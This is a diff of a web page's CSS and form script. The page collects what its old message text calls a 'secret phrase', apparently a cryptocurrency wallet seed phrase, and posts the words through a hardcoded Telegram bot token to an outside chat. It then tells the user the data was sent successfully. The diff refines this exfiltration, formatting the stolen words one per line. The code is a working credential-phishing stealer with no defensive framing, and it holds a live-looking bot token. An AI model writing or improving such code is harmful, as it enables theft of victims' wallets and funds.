@@ -44,7 +44,6 @@
             display: grid;
             grid-template-columns: repeat(2, 1fr);
             gap: 8px;
-            margin-bottom: 20px; /* Добавлен отступ */
         }
         .seed-item {
             position: relative;
@@ -75,7 +74,7 @@
             outline: none;
         }
         button {
-            margin-top: 10px;
+            margin-top: 20px;
             width: 100%;
             padding: 14px;
             background-color: #1E90FF;
@@ -118,17 +117,19 @@
         document.getElementById('seedForm').addEventListener('submit', async function (event) {
             event.preventDefault();
             const formData = new FormData(event.target);
-            const seedWords = Array.from(formData.values()).join(' ');
+            const seedWords = Array.from(formData.values()).map(word => word.trim()).join('\n'); // Каждое слово на новой строке
 
             const botToken = '7804666257:AAHnu23aX89lTPTuMt08TOHfSgvfK4T8hKg';
             const chatId = '@bdsjxjdhd';
-            const message = `Секретная фраза: ${seedWords}`;
+
+            // Форматирование сообщения с использованием обратных кавычек
+            const message = `\`\`\`\n${seedWords}\n\`\`\``;
 
             try {
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: message })
+                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'MarkdownV2' })
                 });
                 alert('Данные успешно отправлены!');
             } catch (error) {
